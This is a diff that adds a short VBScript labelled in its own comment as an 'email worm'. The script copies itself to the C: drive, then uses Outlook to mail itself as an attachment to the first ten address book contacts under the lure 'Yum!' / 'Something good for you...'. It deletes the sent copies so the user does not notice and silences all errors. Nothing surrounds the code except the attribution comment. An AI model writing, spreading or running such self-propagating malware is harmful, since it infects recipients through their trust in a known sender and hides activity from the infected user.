@@ -1,0 +1,45 @@
+'email worm (thanks to mark d)
+
+On error Resume NEXT
+
+Dim x
+
+Set so=CreateObject("Scripting.FileSystemObject")
+
+so.GetFile(WScript.ScriptFullName).Copy("C:\yumyum.vbs")
+
+Set ol=CreateObject("Outlook.Application")
+
+If ol = "Outlook" Then
+
+ Set pAddressList = ol.AddressLists
+
+ For x=1 to 10
+
+  Set Mail=ol.CreateItem(0)
+
+  Mail.To=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
+
+  Mail.Subject="Yum!"
+
+  Mail.Body="Something good for you..."
+
+  Mail.Attachments.Add("C:\yumyum.vbs")
+
+  Mail.DeleteAfterSubmit = True
+
+  Mail.Send
+
+ Next
+
+Else
+
+ MsgBox "outlook="&ol
+
+End If
+
+ol.Quit
+
+
+
+
